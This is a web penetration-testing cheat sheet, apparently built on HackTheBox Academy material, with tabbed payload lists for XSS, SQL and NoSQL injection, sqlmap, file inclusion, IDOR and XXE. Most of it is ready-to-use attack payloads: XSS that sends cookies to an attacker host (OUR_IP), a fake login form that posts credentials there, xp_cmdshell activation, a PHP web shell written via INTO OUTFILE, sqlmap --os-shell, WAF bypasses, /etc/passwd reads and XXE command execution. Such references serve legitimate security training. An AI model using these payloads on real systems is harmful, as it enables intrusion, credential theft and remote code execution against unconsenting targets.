# Targeted Test Cases

{% tabs %}
{% tab title="XSS" %}


| Code                                                                                                                                                                                                                                                                                                                                                                                                  | Description                                |
| ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------ |
| `<script>alert(window.origin)</script>`                                                                                                                                                                                                                                                                                                                                                               | Basic XSS Payload                          |
| `<plaintext>`                                                                                                                                                                                                                                                                                                                                                                                         | Basic XSS Payload                          |
| `<script>print()</script>`                                                                                                                                                                                                                                                                                                                                                                            | Basic XSS Payload                          |
| `<img src="" onerror=alert(window.origin)>`                                                                                                                                                                                                                                                                                                                                                           | HTML-based XSS Payload                     |
| `<script>document.body.style.background = "#141d2b"</script>`                                                                                                                                                                                                                                                                                                                                         | Change Background Color                    |
| `<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>`                                                                                                                                                                                                                                                                                                         | Change Background Image                    |
| `<script>document.title = 'HackTheBox Academy'</script>`                                                                                                                                                                                                                                                                                                                                              | Change Website Title                       |
| `<script>document.getElementsByTagName('body')[0].innerHTML = 'text'</script>`                                                                                                                                                                                                                                                                                                                        | Overwrite website's main body              |
| `<script>document.getElementById('urlform').remove();</script>`                                                                                                                                                                                                                                                                                                                                       | Remove certain HTML element                |
| `<script src="http://OUR_IP/script.js"></script>`                                                                                                                                                                                                                                                                                                                                                     | Load remote script                         |
| `<script>new Image().src='http://OUR_IP/index.php?c='+document.cookie</script>`                                                                                                                                                                                                                                                                                                                       | Send Cookie details to us                  |
| **`<iframe src=file:///C:/windows/win.ini>`**                                                                                                                                                                                                                                                                                                                                                         | Load remote ini file via iframe tag        |
| <p></p><pre class="language-javascript"><code class="lang-javascript">document.write('&#x3C;h3>Please login to continue&#x3C;/h3>&#x3C;form action=http://OUR_IP>&#x3C;input type="username" name="username" placeholder="Username">&#x3C;input type="password" name="password" placeholder="Password">&#x3C;input type="submit" name="submit" value="Login">&#x3C;/form>');
</code></pre><p><br></p> | Login Form Injection                       |
| curl -isk "https://site.com"                                                                                                                                                                                                                                                                                                                                                                          | Test for status of Content Security Policy |

#### Serve XSS 𝙥𝙖𝙮𝙡𝙤𝙖𝙙 from a XML file

```
<?xml version="1.0" encoding="UTF-8"?>
<html xmlns:html="http://w3.org/1999/xhtml">
<html:script>prompt(document.domain);</html:script>
</html>
```

#### Sample XSS Polyglot

```
'"onclick=(co\u006efirm)?.`0`><sVg/i="${{7*7}}"oNload=" 0>(pro\u006dpt)`1`"></svG/</sTyle/</scripT/</textArea/</iFrame/</noScript/</seLect/--><h1><iMg/srC/onerror=alert`2`>%22%3E%3CSvg/onload=confirm`3`//<Script/src=//ChiragXSS.xSs.ht></scripT>
```

#### **How to perform basic Login Form Injection via Reflected XSS**&#x20;

Step 1: Test vulnerable form for the remove function by running script in console (Dev-Tools)

```
document.getElementById('urlform').remove();
```

Step 2: Inject form into webpage with XSS payload by executing the below script into console (Dev-tools)

```
document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');
```
{% endtab %}

{% tab title="SQLi" %}
After successfully authenticating to a SQL Server \
It is worth a shot to verify if xp\_cmdshell has been previously activated with:\


```
EXEC xp_cmdshell 'net user';
```

If xp\_cmdshell has not been activated, run the below commands to activate and utilize Windows XP cmd commands within SQL:

<pre><code># The command below enables sp_configure 

<strong>EXEC sp_configure 'show advanced options', 1;
</strong></code></pre>

```
RECONFIGURE; sp_configure; 
```

```
message EXEC sp_configure 'xp_cmdshell', 1;
```

```
RECONFIGURE;
```

#### Basic SQL Testing

{% tabs %}
{% tab title="General SQL Commands" %}
| Command       | Description                                         |
| ------------- | --------------------------------------------------- |
| `SELECT`      | Select data from database                           |
| `FROM`        | Specify table to retrieve data                      |
| `WHERE`       | Filter query to match a given condition             |
| `INSERT`      | Add single row to table                             |
| `CREATE`      | Used to Create a TABLE, DATABASE, INDEX or VIEW     |
| `ALTER TABLE` | Add/Remove columns from a table                     |
| `UPDATE`      | Update table data                                   |
| `DELETE`      | Delete rows from table                              |
| `AS`          | Used to rename column/table with alias              |
| `JOIN`        | Combine rows from 2 or more tables                  |
| `AND`         | Combine query conditions (must meet all conditions) |
| `OR`          | Combine query conditions. (only one must be met)    |
| `LIMIT`       | Limit the amount of rows returned                   |
| `IN`          | Specify multiple values (only used with WHERE)      |
| `CASE`        | Return value on a specified condition               |
| `IS NULL`     | Return only rows with a NULL value                  |
| `LIKE`        | Search for pattern in a column                      |
| `COMMIT`      | Write a transaction to the database                 |
| `ROLLBACK`    | Undo a transaction                                  |
| `DROP`        | Delete TABLE, DATABASE or INDEX                     |
| `GROUP BY`    | Group data into logical sets                        |
| `ORDER BY`    | Set order of results                                |
| `HAVING`      | Functions like WHERE but filters groups             |
| `COUNT`       | Count rows                                          |
| `SUM`         | Return a sum of a column                            |
| `AVG`         | Return average of a column                          |
| `MIN`         | Return min value of a column                        |
| `MAX`         | Return max value of a column                        |
{% endtab %}

{% tab title="MySQL Basics" %}
### MySQL Basics

| Command                                                           | Description                                              |
| ----------------------------------------------------------------- | -------------------------------------------------------- |
| **General**                                                       |                                                          |
| `mysql -u root -h docker.hackthebox.eu -P 3306 -p`                | login to mysql database                                  |
| `SHOW DATABASES`                                                  | List available databases                                 |
| `USE users`                                                       | Switch to database                                       |
| **Tables**                                                        |                                                          |
| `CREATE TABLE logins (id INT, ...)`                               | Add a new table                                          |
| `SHOW TABLES`                                                     | List available tables in current database                |
| `DESCRIBE logins`                                                 | Show table properties and columns                        |
| `INSERT INTO table_name VALUES (value_1,..)`                      | Add values to table                                      |
| `INSERT INTO table_name(column2, ...) VALUES (column2_value, ..)` | Add values to specific columns in a table                |
| `UPDATE table_name SET column1=newvalue1, ... WHERE <condition>`  | Update table values                                      |
| **Columns**                                                       |                                                          |
| `SELECT * FROM table_name`                                        | Show all columns in a table                              |
| `SELECT column1, column2 FROM table_name`                         | Show specific columns in a table                         |
| `DROP TABLE logins`                                               | Delete a table                                           |
| `ALTER TABLE logins ADD newColumn INT`                            | Add new column                                           |
| `ALTER TABLE logins RENAME COLUMN newColumn TO oldColumn`         | Rename column                                            |
| `ALTER TABLE logins MODIFY oldColumn DATE`                        | Change column datatype                                   |
| `ALTER TABLE logins DROP oldColumn`                               | Delete column                                            |
| **Output**                                                        |                                                          |
| `SELECT * FROM logins ORDER BY column_1`                          | Sort by column                                           |
| `SELECT * FROM logins ORDER BY column_1 DESC`                     | Sort by column in descending order                       |
| `SELECT * FROM logins ORDER BY column_1 DESC, id ASC`             | Sort by two-columns                                      |
| `SELECT * FROM logins LIMIT 2`                                    | Only show first two results                              |
| `SELECT * FROM logins LIMIT 1, 2`                                 | Only show first two results starting from index 2        |
| `SELECT * FROM table_name WHERE <condition>`                      | List results that meet a condition                       |
| `SELECT * FROM logins WHERE username LIKE 'admin%'`               | List results where the name is similar to a given string |

#### MySQL Operator Precedence

* Division (`/`), Multiplication (`*`), and Modulus (`%`)
* Addition (`+`) and Subtraction (`-`)
* Comparison (`=`, `>`, `<`, `<=`, `>=`, `!=`, `LIKE`)
* NOT (`!`)
* AND (`&&`)
* OR (`||`)

#### SQL Injection

| Payload                                                                                                                                    | Description                                          |
| ------------------------------------------------------------------------------------------------------------------------------------------ | ---------------------------------------------------- |
| **Auth Bypass**                                                                                                                            |                                                      |
| `admin' or '1'='1`                                                                                                                         | Basic Auth Bypass                                    |
| `admin')-- -`                                                                                                                              | Basic Auth Bypass With comments                      |
| [Auth Bypass Payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass)              |                                                      |
| **Union Injection**                                                                                                                        |                                                      |
| `' order by 1-- -`                                                                                                                         | Detect number of columns using `order by`            |
| `cn' UNION select 1,2,3-- -`                                                                                                               | Detect number of columns using Union injection       |
| `cn' UNION select 1,@@version,3,4-- -`                                                                                                     | Basic Union injection                                |
| `UNION select username, 2, 3, 4 from passwords-- -`                                                                                        | Union injection for 4 columns                        |
| **DB Enumeration**                                                                                                                         |                                                      |
| `SELECT @@version`                                                                                                                         | Fingerprint MySQL with query output                  |
| `SELECT SLEEP(5)`                                                                                                                          | Fingerprint MySQL with no output                     |
| `cn' UNION select 1,database(),2,3-- -`                                                                                                    | Current database name                                |
| `cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -`                                                                  | List all databases                                   |
| `cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -`                                 | List all tables in a specific database               |
| `cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -`                | List all columns in a specific table                 |
| `cn' UNION select 1, username, password, 4 from dev.credentials-- -`                                                                       | Dump data from a table in another database           |
| **Privileges**                                                                                                                             |                                                      |
| `cn' UNION SELECT 1, user(), 3, 4-- -`                                                                                                     | Find current user                                    |
| `cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -`                                                               | Find if user has admin privileges                    |
| `cn' UNION SELECT 1, grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE user="root"-- -`                  | Find if all user privileges                          |
| `cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -` | Find which directories can be accessed through MySQL |
| **File Injection**                                                                                                                         |                                                      |
| `cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -`                                                                                   | Read local file                                      |
| `select 'file written successfully!' into outfile '/var/www/html/proof.txt'`                                                               | Write a string to a local file                       |
| `cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -`                                  | Write a web shell into the base web directory        |
{% endtab %}

{% tab title="NoSQL Basics" %}
### NoSQL Basics

| Command                                                            | Description                                                       |
| ------------------------------------------------------------------ | ----------------------------------------------------------------- |
| `show dbs;`                                                        | List all the databases present                                    |
| `use user_creds;`                                                  | Switch to database named "user\_creds"                            |
| `show collections;`                                                | List out the collections in a database                            |
| `db.flag.find().pretty()`                                          | Dump the contents of the documents present in the flag collection |
| `http://url?login[$nin][]=admin&login[$nin][]=test&pass[$ne]=toto` | Basic NoSQLi Login                                                |
{% endtab %}

{% tab title="SQLmap" %}
### SQLmap

| Command                                                                                                                   | Description                                                 |
| ------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------- |
| `sqlmap -h`                                                                                                               | View the basic help menu                                    |
| `sqlmap -hh`                                                                                                              | View the advanced help menu                                 |
| `sqlmap -u "http://www.example.com/vuln.php?id=1" --batch`                                                                | Run `SQLMap` without asking for user input                  |
| `sqlmap 'http://www.example.com/' --data 'uid=1&name=test'`                                                               | `SQLMap` with POST request                                  |
| `sqlmap 'http://www.example.com/' --data 'uid=1*&name=test'`                                                              | POST request specifying an injection point with an asterisk |
| `sqlmap -r req.txt`                                                                                                       | Passing an HTTP request file to `SQLMap`                    |
| `sqlmap ... --cookie='PHPSESSID=abcdefghijklmnop'`                                                                        | Specifying a cookie header                                  |
| `sqlmap -u www.target.com --data='id=1' --method PUT`                                                                     | Specifying a PUT request                                    |
| `sqlmap -u "http://www.target.com/vuln.php?id=1" --batch -t /tmp/traffic.txt`                                             | Store traffic to an output file                             |
| `sqlmap -u "http://www.target.com/vuln.php?id=1" -v 6 --batch`                                                            | Specify verbosity level                                     |
| `sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"`                                                     | Specifying a prefix or suffix                               |
| `sqlmap -u www.example.com/?id=1 -v 3 --level=5`                                                                          | Specifying the level and risk                               |
| `sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba`                                  | Basic DB enumeration                                        |
| `sqlmap -u "http://www.example.com/?id=1" --tables -D testdb`                                                             | Table enumeration                                           |
| `sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surname`                                      | Table/row enumeration                                       |
| `sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"`                             | Conditional enumeration                                     |
| `sqlmap -u "http://www.example.com/?id=1" --schema`                                                                       | Database schema enumeration                                 |
| `sqlmap -u "http://www.example.com/?id=1" --search -T user`                                                               | Searching for data                                          |
| `sqlmap -u "http://www.example.com/?id=1" --passwords --batch`                                                            | Password enumeration and cracking                           |
| `sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"` | Anti-CSRF token bypass                                      |
| `sqlmap --list-tampers`                                                                                                   | List all tamper scripts                                     |
| `sqlmap -u "http://www.example.com/case1.php?id=1" --is-dba`                                                              | Check for DBA privileges                                    |
| `sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"`                                                      | Reading a local file                                        |
| `sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"`                 | Writing a file                                              |
| `sqlmap -u "http://www.example.com/?id=1" --os-shell`                                                                     | Spawning an OS shell                                        |
{% endtab %}
{% endtabs %}

**WAF BYPASSES**

```
SELECT-1e1FROM`test`
SELECT~1.FROM`test`
SELECT\NFROM`test`
SELECT@^1.FROM`test`
SELECT-id-1.FROM`test`
```

**Passwords**

```
uNiOn aLl SeleCt 1,2,3,4,conCat(username,0x3a,password),6 FroM users
uNiOn aLl SeleCt 1,2,3,4,conCat(username,0x3a,password,0x3a,flag),6 FroM users
```
{% endtab %}

{% tab title="File Inclusion" %}
## File Inclusion Parameters

1. ?cat={payload}
2. ?dir={payload}
3. ?action={payload}
4. ?board={payload}
5. ?date={payload}
6. ?detail={payload}
7. ?file={payload}
8. ?download={payload}
9. ?path={payload}
10. ?folder={payload}
11. ?prefix={payload}
12. ?include={payload}
13. ?page={payload}
14. ?inc={payload}
15. ?locate={payload}
16. ?show={payload}
17. ?doc={payload}
18. ?site={payload}
19. ?type={payload}
20. ?view={payload}
21. ?content={payload}
22. ?document={payload}
23. ?layout={payload}
24. ?mod={payload}
25. ?conf={payload}



## LFI workaround PoC

LFI via this path does not work at first&#x20;

&#x20;`/fileRead.jsp?fileName=/etc/passwd (406)`&#x20;

But after replacing character with ? you may receive a successful response (200)

`/fileRead.jsp?fileName=/?tc/?asswd (200)`

`fileRead.jsp?fileName=/??c/??sswd (200)`
{% endtab %}

{% tab title="IDOR Checklist" %}
* Find and replace `IDs` in urls, headers and body : `/users/01`=> `/users/02`
* Try Parameter Pollution: `users=01` => `users=01&users=02`
* Special Characters: `/users/01*` or `/users/*`  => Disclosure of every single user
* Try Older versions of API endpoints: `/api/v3/users/01` => `/api/v1/users/02`
* Add extension: `/users/01` => `/users/02.json`
* Change Request Methods: POST /users/01 => `GET, PUT, PATCH, DELETE, OPTIONS,`etc
* Check if Referer or other Headers are used to validate `IDs:`
  * [ ] `GET /users/02`                                                              \
    &#x20;  `Referer: example.com/users/`<mark style="color:red;">`01`</mark>                                     =>             `403 Forbidden`\

  *   [ ] `GET /users/02`

      `Referer: example.com/users/`<mark style="color:red;">`02`</mark>                                        =>             `200 OK`
* Encrypted IDs: If application is using encrypted IDs, try to decrypt using hashing/cracking tool
* Send wildcard `{""user_id"":""*""}`
* Send ID twice `URL?id=&id=`
* JSON wrap {“id”:111} --> `{“id”:{“id”:111}}`
* Wrap ID with an array {“id”:111} --> `{“id”:[111]}`
* Swap GUID with Numeric ID or email:\
  `/users/XXXXXXXX-XXXX-XXXX-XXXXXXXXXXXX`   => `/users/02` or `/users/a@b.com`
* Try GUIDs such as:\
  `00000000-0000-0000-000000000000` and `11111111-1111-1111-111111111111`
* GUID Enumeration: Try to disclose GUIDs using `Google Dorks`, `Github`, `Wayback`, `Burp history`
* If none of the GUID Enumeration methods work then try: `SignUp`, `Reset Password`, and `other endpoints` and analyze the responses. An endpoint may disclose user's GUID within the application.
* When a server responds with a 401/403, the action may still be performed. Ensure to verify the function within the application.&#x20;
* Blind IDORs: Look for endpoints/features that may disclose information&#x20;
* Chain IDOR with XSS for Account Takeovers\

{% endtab %}

{% tab title="XXE" %}
Send Post request with path to xml file for exploitation

```
curl -d@/home/researcher/Desktop/payloads/poc.xml http://vulnerablesite.com/home/vulnerable.php
```

OR\
Use a script to send payload:\
\
curl.sh

```
#!/bin/bash
curl -d@/home/researcher/Desktop/payloads/poc.xml http://vulnerablesite.com/home/vulnerable.php
```



ID.xml

```
<!--ID command example-->
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "expect://id" >]>

<entry>
    <subject>&xxe;</subject>
    <category>Clothing</category>
    <text>New Shoes</text>
</entry>
```

Read Robots.txt (Base 64)

```
<!--Base64 response example-->
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/respource=http://vulnerable site/" >]>

<entry>
    <subject>&xxe;</subject>
    <category>Clothing</category>
    <text>New Shoes</text>
</entry>
```
{% endtab %}

{% tab title="Additonal Payloads" %}
#### Test for XSS and SQLi

```
--'`"><img src=x>kdskf${{7*7}}
```

Enter in EVERY parameter

* '"\` Javascript injection test
* '\`"> html tag attribute test
* &#x20;HTML injection
* $\{{7\*7\}} CSTI + SSTI
* \--'\`" SQLi
{% endtab %}
{% endtabs %}

{% tabs %}
{% tab title="Session Management" %}
#### Utilizing Burp Sequencer



Login to application to get a session id/cookie

Find a request that is associated with session/cookie value in a server response

Send this request to Burp sequencer> go to Sequencer tab

In Live capture menu, select cookie value and Start live capture

ENSURE THAT RESULTS ARE ABOIVE FIPS PASS LEVEL

Note: This is very noisy
{% endtab %}

{% tab title="Second Tab" %}

{% endtab %}
{% endtabs %}
